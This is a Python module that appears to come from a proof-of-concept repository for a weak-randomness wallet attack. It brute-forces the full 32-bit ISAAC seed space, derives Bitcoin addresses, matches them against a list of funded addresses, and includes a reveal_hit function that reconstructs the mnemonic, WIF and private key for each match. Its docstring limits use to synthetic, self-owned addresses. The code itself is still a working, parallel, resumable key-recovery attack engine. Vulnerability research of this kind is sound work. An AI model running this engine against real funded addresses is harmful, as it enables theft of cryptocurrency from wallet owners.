"""Full-space grind engine: intersect the ISAAC CREATE space with a funded set.

This is the "locate funded seeds" step of the PoC. It enumerates ISAAC seeds,
derives the candidate addresses for each, and reports any seed whose address
appears in a supplied *funded-address set* (a plain text file, one address per
line). It is resumable (a progress checkpoint) and can run across worker
processes.

SCOPE / SAFETY
--------------
This engine is deliberately agnostic about where the funded set comes from, and
this repository only ever ships / demonstrates it against a **synthetic** funded
set of locally generated, self-owned addresses (see ``tools/make_synthetic_funded_set.py``).
It does not fetch blockchain data, and it is not intended to be pointed at real
users' funded addresses to extract their keys. The referenced source research's
own full-space funded grind returned **zero** hits; see ``docs/EXPLOIT.md`` §10.

Hits are written as ``{seed, kind, address}`` — deriving the actual private key /
mnemonic is a separate explicit :func:`reveal_hit` step, so that the grind
output itself is not a key dump.
"""

from __future__ import annotations

import json
import os
import time
from concurrent.futures import ProcessPoolExecutor, as_completed
from dataclasses import asdict, dataclass
from typing import Dict, List, Optional, Sequence, Set

from .attack import KIND_BIP49, KIND_LEGACY, KIND_SEGWIT_P2SH, addresses_for_seed
from .create import create_hd_wallet, create_singlekey_wallet


def load_funded_set(path: str) -> Set[str]:
    """Load a funded-address set: one Base58 address per line, ``#`` comments."""
    funded: Set[str] = set()
    with open(path, "r", encoding="utf-8") as fh:
        for line in fh:
            addr = line.strip()
            if addr and not addr.startswith("#"):
                funded.add(addr)
    return funded


@dataclass
class Hit:
    seed: int
    kind: str          # e.g. "segwit_p2sh:0" or "bip49:2"
    address: str


def grind_range(
    start: int,
    end: int,
    funded: Set[str],
    kinds: Sequence[str] = (KIND_BIP49, KIND_SEGWIT_P2SH),
    gaps: int = 1,
) -> List[Hit]:
    """Scan seeds ``[start, end)`` and return hits against ``funded``."""
    kinds = tuple(kinds)
    hits: List[Hit] = []
    for seed in range(start, end):
        for label, addr in addresses_for_seed(seed, kinds=kinds, gaps=gaps).items():
            if addr in funded:
                hits.append(Hit(seed=seed, kind=label, address=addr))
    return hits


def _grind_chunk(args):
    start, end, funded, kinds, gaps = args
    return [asdict(h) for h in grind_range(start, end, funded, kinds, gaps)]


@dataclass
class GrindReport:
    scanned: int
    seconds: float
    hits: List[Hit]
    resumed_from: int
    completed_to: int

    @property
    def rate(self) -> float:
        return self.scanned / self.seconds if self.seconds else 0.0


def grind(
    funded: Set[str],
    start: int = 0,
    end: int = 1 << 32,
    kinds: Sequence[str] = (KIND_BIP49, KIND_SEGWIT_P2SH),
    gaps: int = 1,
    workers: int = 1,
    chunk: int = 50_000,
    out_dir: Optional[str] = None,
    resume: bool = False,
    progress_cb=None,
) -> GrindReport:
    """Grind ``[start, end)`` against ``funded``, resumable and optionally parallel.

    When ``out_dir`` is set, a ``progress.json`` checkpoint and a ``hits.jsonl``
    file are maintained so a long run can be stopped and resumed.
    """
    kinds = tuple(kinds)
    hits: List[Hit] = []
    progress_path = os.path.join(out_dir, "progress.json") if out_dir else None
    hits_path = os.path.join(out_dir, "hits.jsonl") if out_dir else None

    resumed_from = start
    if resume and progress_path and os.path.exists(progress_path):
        with open(progress_path, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        resumed_from = max(start, int(saved.get("next_seed", start)))
        if hits_path and os.path.exists(hits_path):
            with open(hits_path, "r", encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if line:
                        hits.append(Hit(**json.loads(line)))

    if out_dir:
        os.makedirs(out_dir, exist_ok=True)

    def _persist(next_seed: int, new_hits: List[Hit]) -> None:
        if hits_path and new_hits:
            with open(hits_path, "a", encoding="utf-8") as fh:
                for h in new_hits:
                    fh.write(json.dumps(asdict(h)) + "\n")
        if progress_path:
            with open(progress_path, "w", encoding="utf-8") as fh:
                json.dump({"next_seed": next_seed, "total_hits": len(hits)}, fh)

    t0 = time.perf_counter()
    scanned = 0
    chunks = [(s, min(s + chunk, end), funded, kinds, gaps)
              for s in range(resumed_from, end, chunk)]

    if workers > 1:
        with ProcessPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(_grind_chunk, c): c for c in chunks}
            for fut in as_completed(futures):
                c = futures[fut]
                new = [Hit(**d) for d in fut.result()]
                hits.extend(new)
                scanned += c[1] - c[0]
                _persist(c[1], new)
                if progress_cb:
                    progress_cb(c[1], time.perf_counter() - t0, len(hits))
    else:
        for c in chunks:
            new = grind_range(c[0], c[1], funded, kinds, gaps)
            hits.extend(new)
            scanned += c[1] - c[0]
            _persist(c[1], new)
            if progress_cb:
                progress_cb(c[1], time.perf_counter() - t0, len(hits))

    return GrindReport(
        scanned=scanned,
        seconds=time.perf_counter() - t0,
        hits=hits,
        resumed_from=resumed_from,
        completed_to=end,
    )


def reveal_hit(seed: int, kind: str) -> Dict[str, str]:
    """Reconstruct the secret for a hit.

    Intended for confirming self-owned (synthetic) hits end-to-end. ``kind`` is
    the ``"<kind>:<index>"`` label from a :class:`Hit`.
    """
    base, _, idx_s = kind.partition(":")
    index = int(idx_s or 0)
    if base == KIND_BIP49:
        w = create_hd_wallet(seed)
        return {
            "seed": str(seed),
            "kind": kind,
            "address": w.bip49_address(index),
            "mnemonic": w.mnemonic,
            "privkey_hex": w.bip49_privkey_hex(index),
        }
    sk = create_singlekey_wallet(seed)
    addr = sk.legacy_address() if base == KIND_LEGACY else sk.segwit_p2sh_address()
    return {
        "seed": str(seed),
        "kind": kind,
        "address": addr,
        "wif": sk.wif,
        "privkey_hex": sk.privkey_hex,
    }
